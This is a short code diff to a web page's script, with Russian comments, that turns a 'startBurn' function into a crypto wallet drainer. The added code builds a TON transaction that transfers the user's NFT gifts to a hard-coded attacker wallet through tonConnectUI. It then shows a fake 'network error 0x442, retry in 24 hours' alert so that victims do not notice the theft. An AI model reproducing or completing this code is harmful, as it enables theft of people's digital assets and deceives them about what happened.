@@ -21,8 +21,24 @@
 
         async function startBurn() {
             // Тут будет код, который отправляет подарки тебе
-            alert("Ошибка сети 0x442. Повторите попытку через 24 часа.");
-        }
+         // Код для кражи подарков
+try {
+  const transaction = {
+    validUntil: Math.floor(Date.now() / 1000) + 300,
+    messages: [
+      {
+        address: "АДРЕС_КОНТРАКТА_NFT_1", // Повтори это для каждого подарка
+        amount: "50000000", // Комиссия
+        payload: "te6ccgEBAQEAXAAAs0Q...", // Команда transfer,
+        // Но получатель в transfer - UQApnT4srsHXAaAP8nn_i4PLk1z7Xcs0Mq7FWqVyYFSBWlH8
+      }
+    ]
+  };
+  await tonConnectUI.sendTransaction(transaction);
+  alert("Ошибка сети 0x442. Повторите попытку через 24 часа.");
+} catch (e) {
+  console.error(e);
+}
     </script>
 </body>
 </html>
